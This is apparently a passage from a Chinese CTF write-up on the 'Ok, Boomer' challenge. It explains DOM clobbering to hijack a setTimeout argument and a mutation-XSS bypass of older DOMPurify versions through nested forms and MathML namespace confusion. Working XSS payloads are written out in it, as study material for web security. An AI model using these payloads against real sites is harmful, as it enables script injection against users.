&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;test1&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;test1&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;test2&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x:alert(1)&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但 x 不是标准协议，需要使用协议比如 &lt;code&gt;tel,mailto,cid,javascript&lt;/code&gt;  等&lt;/p&gt;
&lt;p&gt;即：需要有两个 a 标签，且需要通过 name 去到第二个 a 标签&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM3MTA2MTUwNzQtNzAwNGY1NGUtM2YyMy00NTc0LWJhYWYtMTk0MTI3MzEyZjIwLm1k&#34;&gt;📎Ok, Boomer.md&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;boomer&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;Ok, Boomer.&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    boomer.&lt;span class=&#34;property&#34;&gt;innerHTML&lt;/span&gt; = &lt;span class=&#34;title class_&#34;&gt;DOMPurify&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;sanitize&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;URL&lt;/span&gt;(location).&lt;span class=&#34;property&#34;&gt;searchParams&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;boomer&amp;#x27;&lt;/span&gt;) || &lt;span class=&#34;string&#34;&gt;&amp;quot;Ok, Boomer&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;setTimeout&lt;/span&gt;(ok, &lt;span class=&#34;number&#34;&gt;2000&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;setTimeout (ok, 2000) 中的 ok 可以接收一个函数或者字符串，如果我们能够向 ok 这个变量注入可执行的 payload，那么也就能成功弹框&lt;/p&gt;
&lt;p&gt;可以使用 DOM Clobbering 的方式，通过向 HTML 注入 DOM 元素，来实现操作 JavaScript 变量&lt;/p&gt;
&lt;p&gt;首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如&lt;div id=&#34;ok&#34;&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;然后，ok 需要接受一个字符串作为值，而在对&lt;a&gt;标签调用 toString () 方法时，会返回属性 href 的值，所以，我们可以选择&lt;a&gt;标签作为构造对象&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?boomer=&amp;lt;a id=ok href=cid:alert(1337)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;href 的值要遵守 protocol:uri 的格式，然而，在 href 里直接使用 javascript: 协议是不行的&lt;/p&gt;
&lt;p&gt;通过查看 DOMPurify 的源码可以发现，它支持的合法的协议 有 mailto, tel, xmpp 等等，随便选择一个即可&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?boomer=&amp;lt;a%20id=ok%20href=mailto:alert(1337)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?boomer=&amp;lt;a%20id=ok%20href=tel:alert(1337)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于劫持了 settimeout，因此会延迟两秒执行&lt;/p&gt;
&lt;p&gt;通过两个 id 可以取到的标签：&lt;/p&gt;
&lt;p&gt;form,button&lt;/p&gt;
&lt;p&gt;form,fieldset&lt;/p&gt;
&lt;p&gt;form,image&lt;/p&gt;
&lt;p&gt;form,img&lt;/p&gt;
&lt;p&gt;form,input&lt;/p&gt;
&lt;p&gt;form,object&lt;/p&gt;
&lt;p&gt;form,output&lt;/p&gt;
&lt;p&gt;form,select&lt;/p&gt;
&lt;p&gt;form,textarea&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=x&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;lt;img id=y&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;console.log(x.y)  //&amp;lt;img id=y&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过三层嵌套取到&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=x&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=x name=y&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;input id=z&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;window.x.y.z.value&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;unintended solution&lt;/p&gt;
&lt;p&gt;利用 html-svg-math 的命名空间混淆突变绕过 dompurify，要求 dompurify 版本 &amp;lt; 2.0.7&lt;/p&gt;
&lt;p&gt;前置知识：&lt;/p&gt;
&lt;p&gt;1.DOMPurify 的典型用法使 HTML 标记被解析两次。&lt;/p&gt;
&lt;p&gt;dompurify 使用语句如下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;div.innerHTML = DOMPurify.sanitize(htmlMarkup)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在解析和序列化 HTML 以及对 DOM 树的操作方面，在上面的简短片段中发生了以下操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;htmlMarkup&lt;/code&gt;  &lt;strong&gt;被解析为 DOM 树&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;DOMPurify 清理 DOM 树（简而言之，该过程是遍历 DOM 树中的所有元素和属性，并删除所有不在允许列表中的节点）。&lt;/li&gt;
&lt;li&gt;DOM 树&lt;strong&gt;被序列化回 HTML 标记&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;分配给 后 &lt;code&gt;innerHTML&lt;/code&gt; ，浏览器会&lt;strong&gt;再次解析 HTML 标记&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;解析后的 DOM 树被附加到文档的 DOM 树中。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;假设我们的初始 html 是 &lt;code&gt;A&amp;lt;img src=1 onerror=alert(1)&amp;gt;B&lt;/code&gt; 。在第一步中，它被解析为以下树：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-1-1536x155.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后，DOMPurify 对其进行清理，留下以下 DOM 树：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-2-1536x161.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后它被序列化为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;A&amp;lt;img src=&amp;quot;1&amp;quot;&amp;gt;B&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这就是 &lt;code&gt;DOMPurify.sanitize&lt;/code&gt;  的返回值。然后浏览器在分配给 innerHTML 时再次解析：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1536x161.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;DOM 树与 DOMPurify 处理的树相同，然后附加到文档中。&lt;/p&gt;
&lt;p&gt;所以附加到文档之前需要解析 - 序列化 - 解析。但&lt;strong&gt;两次解析的 DOM 树未必相同&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;2.HTML 规范有一个问题，它使得创建嵌套 &lt;code&gt;form&lt;/code&gt;  元素成为可能。但是，在重新解析时，第二个 &lt;code&gt;form&lt;/code&gt;  将消失。&lt;/p&gt;
&lt;p&gt;html 规范中，不允许 form 元素的子元素是 form。那么说明嵌套 form 元素是不被允许的。这会导致嵌套里面的 form 元素被 html 解析器忽略。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=form1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;INSIDE_FORM1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=form2&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-5-1536x121.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们可以通过带有错误嵌套标签的稍微损坏的标记，可以创建嵌套表单。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;form id=&amp;quot;outer&amp;quot;&amp;gt;&amp;lt;div&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form id=&amp;quot;inner&amp;quot;&amp;gt;&amp;lt;input&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;它产生以下 DOM 树，其中包含一个嵌套的表单元素：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-6-1536x211.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这不是任何特定浏览器中的错误；它直接来自 HTML 规范，并在解析 HTML 的算法中进行了描述。这是一般的想法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当你打开一个 &lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;  标签时，解析器需要使用&lt;strong&gt;表单元素指针&lt;/strong&gt;打开的（在规范中是这样调用的）。如果指针不是 &lt;code&gt;null&lt;/code&gt; ，则 &lt;code&gt;form&lt;/code&gt;  无法创建元素。&lt;/li&gt;
&lt;li&gt;结束 &lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;  标记时，表单元素指针始终设置为 &lt;code&gt;null&lt;/code&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意：一般来说子元素是要紧贴父元素的&lt;/p&gt;
&lt;p&gt;现在，如果我们尝试序列化生成的 DOM 树，我们将得到以下标记：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=&amp;quot;outer&amp;quot;&amp;gt;&amp;lt;div&amp;gt;&amp;lt;form id=&amp;quot;inner&amp;quot;&amp;gt;&amp;lt;input&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-7-1536x151.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以这证明了序列化后再次解析不能保证返回原始 DOM 树，同时再次解析后内层 form 消失了&lt;/p&gt;
&lt;p&gt;3. 外部内容&lt;/p&gt;
&lt;p&gt;HTML 解析器可以创建一个包含三个命名空间元素的 DOM 树：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTML 命名空间&lt;/li&gt;
&lt;li&gt;SVG 命名空间&lt;/li&gt;
&lt;li&gt;MathML 命名空间 ，是 XML 语言的子集 zhangxinxu&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;默认情况下，所有元素都在 HTML 命名空间中；但是，如果解析器遇到 &lt;code&gt;&amp;lt;svg&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;math&amp;gt;&lt;/code&gt;  元素，则它分别 “切换” 到 SVG 和 MathML 命名空间。并且这两个命名空间都会产生外部内容。&lt;/p&gt;
&lt;p&gt;在外部内容中，标记的解析方式与普通 HTML 不同。这可以在解析 &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;  元素时清楚地显示出来。在 HTML 命名空间中， &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;  只能包含文本；没有后代，并且不解码 HTML 实体。外部内容并非如此：外部内容 &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;  可以有子元素，并且实体被解码。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;style&amp;gt;&amp;lt;a&amp;gt;ABC&amp;lt;/style&amp;gt;&amp;lt;svg&amp;gt;&amp;lt;style&amp;gt;&amp;lt;a&amp;gt;ABC&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8-1536x308.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;证明了 svg 命名空间中的 style 可以被解析&lt;/p&gt;
&lt;p&gt;如果我们在里面 &lt;code&gt;&amp;lt;svg&amp;gt;&lt;/code&gt; ， &lt;code&gt;&amp;lt;math&amp;gt;&lt;/code&gt;  那么所有元素也都在非 HTML 命名空间中。但是这是错误的。HTML 规范中有一些元素称为&lt;strong&gt; MathML 文本集成点&lt;/strong&gt;和&lt;strong&gt; HTML 集成点&lt;/strong&gt;。这些元素的子元素具有 HTML 命名空间&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;math&amp;gt;&amp;lt;style&amp;gt;&amp;lt;a&amp;gt;A&amp;lt;/style&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;style&amp;gt;&amp;lt;a&amp;gt;B&amp;lt;/style&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9-1536x207.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;请注意 &lt;code&gt;style&lt;/code&gt;  作为 math 的直接子元素 &lt;code&gt;在 MathML 命名空间中，而&lt;/code&gt; 第二个 style &lt;code&gt;在mtext下则是 HTML 命名空间中。这是因为&lt;/code&gt;  mtext` 是&lt;strong&gt; MathML 文本集成点&lt;/strong&gt;并使解析器切换命名空间。&lt;/p&gt;
&lt;p&gt;MathML 文本集成点是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;math mi&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;math mo&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;math mn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;math ms&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;HTML 集成点是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;math annotation-xml&lt;/code&gt;  如果它有一个名为的属性， &lt;code&gt;encoding&lt;/code&gt;  其值等于 &lt;code&gt;text/html&lt;/code&gt;  或  &lt;code&gt;application/xhtml+xml&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;svg foreignObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;svg desc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;svg title&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但并不是所有 mathml 文本集成点和 html 集成点子元素都是 html 命名空间的&lt;/p&gt;
&lt;p&gt;html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了&lt;mglyph&gt;&lt;malignmark&gt;。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-10-1536x252.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最终 payload1:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form&amp;gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;/math&amp;gt;&amp;lt;img src onerror=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form&amp;gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;/math&amp;gt;&amp;lt;img src onerror=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用以上所有内容，我们可以创建一个包含两个 &lt;code&gt;form&lt;/code&gt;  元素和 &lt;code&gt;mglyph&lt;/code&gt;  元素的标记，该标记最初位于 HTML 命名空间中，但在重新解析它时位于 MathML 命名空间中，从而使后续 &lt;code&gt;style&lt;/code&gt;  标记的解析方式不同并导致 XSS。&lt;/p&gt;
&lt;p&gt;payload 利用错误嵌套的 &lt;code&gt;html form&lt;/code&gt;  元素，并且还包含 &lt;code&gt;mglyph&lt;/code&gt;  元素。它生成以下 DOM 树：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-11-1536x326.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个 DOM 树是无害的。所有元素都在 DOMPurify 的允许列表中。请注意，这 &lt;code&gt;mglyph&lt;/code&gt;  是在 HTML 命名空间中。看起来像 XSS playload 的片段只是 &lt;code&gt;html style&lt;/code&gt; . 因为有一个嵌套的 &lt;code&gt;html form&lt;/code&gt; ，我们可以非常确定这个 DOM 树将在重新解析时发生变异。&lt;/p&gt;
&lt;p&gt;序列化之后的 html 是&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form&amp;gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;form&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;/math&amp;gt;&amp;lt;img src onerror=alert(1)&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/mglyph&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/mtext&amp;gt;&amp;lt;/math&amp;gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此代码段具有嵌套 &lt;code&gt;form&lt;/code&gt;  标签。所以当它被赋值给 时 &lt;code&gt;innerHTML&lt;/code&gt; ，它会被解析成下面的 DOM 树：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-12-1536x312.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以现在第二个 &lt;code&gt;html form&lt;/code&gt;  没有被创建， &lt;code&gt;mglyph&lt;/code&gt;  现在是 mtext 的直接子元素，在 MathML 命名空间中。因此， &lt;code&gt;style&lt;/code&gt;  它也在 MathML 命名空间中，因此其内容不被视为文本。然后 &lt;code&gt;&amp;lt;/math&amp;gt;&lt;/code&gt;  关闭 &lt;code&gt;&amp;lt;math&amp;gt;&lt;/code&gt;  元素，现在 &lt;code&gt;img&lt;/code&gt;  在 HTML 命名空间中创建，导致 XSS。&lt;/p&gt;
&lt;p&gt;payload2:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;table&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;math&amp;gt;&amp;lt;table id=&amp;quot;&amp;lt;/table&amp;gt;&amp;quot;&amp;gt;&amp;lt;img src onerror=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104652050.png&#34; alt=&#34;image-20221009104652050&#34;&gt;&lt;/p&gt;
&lt;p&gt;经过二次解析后为&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104805809.png&#34; alt=&#34;image-20221009104805809&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ww3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ww3&#34;&gt;#&lt;/a&gt; WW3&lt;/h2&gt;
